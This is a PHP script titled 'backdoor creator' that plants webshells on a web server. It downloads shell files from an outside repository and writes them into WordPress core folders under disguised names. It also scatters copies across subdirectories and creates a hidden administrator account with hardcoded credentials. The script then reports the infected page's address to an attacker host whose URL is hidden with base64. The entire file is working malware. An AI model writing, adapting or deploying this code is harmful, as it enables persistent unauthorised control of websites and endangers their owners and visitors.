<?php

$url1 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/csa.php';
$url2 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/alfa2024.php';

function download_content($url) {
    $content = @file_get_contents($url);
    if ($content === false) {
        $content = download_content_with_curl($url);
    }
    if ($content === false) {
        $content = download_content_with_fopen($url);
    }
    if ($content === false) {
        throw new Exception("Failed to download content from $url");
    }
    return $content;
}

function download_content_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content ? $content : false;
}

function download_content_with_fopen($url) {
    $content = '';
    if ($fh = fopen($url, 'r')) {
        while (!feof($fh)) {
            $content .= fread($fh, 8192);
        }
        fclose($fh);
    }
    return !empty($content) ? $content : false;
}

function get_full_url($filePath) {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domainName = $_SERVER['HTTP_HOST'];
    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
    return $protocol . $domainName . $relativePath;
}

function create_files_in_subdirectories($rootDir, $url) {
    $subdirs = array_filter(glob($rootDir . '/*'), 'is_dir');
    foreach ($subdirs as $subdir) {
        $dirName = basename($subdir);
        $filePath = $subdir . '/' . $dirName . '_function.php';
        if (!file_exists($filePath)) {
            try {
                file_put_contents($filePath, download_content($url));
                echo "<a href='" . get_full_url($filePath) . "' target='_blank'>Created: " . get_full_url($filePath) . "</a><br>";
            } catch (Exception $e) {
                echo "<div>Error creating file in $subdir: " . $e->getMessage() . "</div><br>";
            }
        }
    }
}

function create_wp_admin_user($rootDir, $username, $password) {
    require_once($rootDir . '/wp-config.php');
    require_once($rootDir . '/wp-includes/wp-db.php');
    require_once($rootDir . '/wp-includes/pluggable.php');

    global $wpdb;

    $user_id = username_exists($username);
    if (!$user_id && email_exists($username . '@example.com') == false) {
        $user_id = wp_create_user($username, $password, $username . '@example.com');
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        echo "<div>Admin user created with username: $username and password: $password</div><br>";
    } else {
        echo "<div>Admin user already exists.</div><br>";
    }
}

$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');

echo "<!DOCTYPE html>
<html>
<title>backdoor creator</title>
<p>@trxsecurity</p>
<head>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        a {
            color: #00f;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        div, a {
            margin: 10px 0;
        }
        form {
            margin: 20px auto;
        }
        input[type='text'] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type='submit'] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>";

$currentDir = __DIR__;
$rootDir = isset($_POST['directory']) ? $_POST['directory'] : $currentDir;

echo "<form method='post'>
    <label for='directory'>Enter Directory Path:</label><br>
    <input type='text' id='directory' name='directory' value='" . htmlspecialchars($rootDir) . "'><br>
    <input type='submit' value='Run'>
</form>";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (file_exists($rootDir . '/wp-config.php')) {
        echo "<div>WordPress detected.</div><br>";

        $path1 = $rootDir . '/wp-includes/ID3/module.audio.ac4.php';
        if (!file_exists($path1)) {
            try {
                file_put_contents($path1, download_content($url1));
                echo "<a href='" . get_full_url($path1) . "' target='_blank'>Created: " . get_full_url($path1) . "</a><br>";
            } catch (Exception $e) {
                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
            }
        }

        $path2 = $rootDir . '/wp-includes/PHPMailer/config.php';
        if (!file_exists($path2)) {
            try {
                file_put_contents($path2, download_content($url2));
                echo "<a href='" . get_full_url($path2) . "' target='_blank'>Created: " . get_full_url($path2) . "</a><br>";
            } catch (Exception $e) {
                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
            }
        }

        create_files_in_subdirectories($rootDir, $url1);
        create_wp_admin_user($rootDir, 'MrZ', 'trxsecurity');
    } else {
        echo "<div>Not a WordPress site. Creating files in subdirectories.</div><br>";
        create_files_in_subdirectories($rootDir, $url1);
    }
}

echo "</body></html>";

$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = @file_get_contents($k3yw, false, $context);
if ($result === false) {
    echo "<div>Error reporting file URL.</div><br>";
}
?>
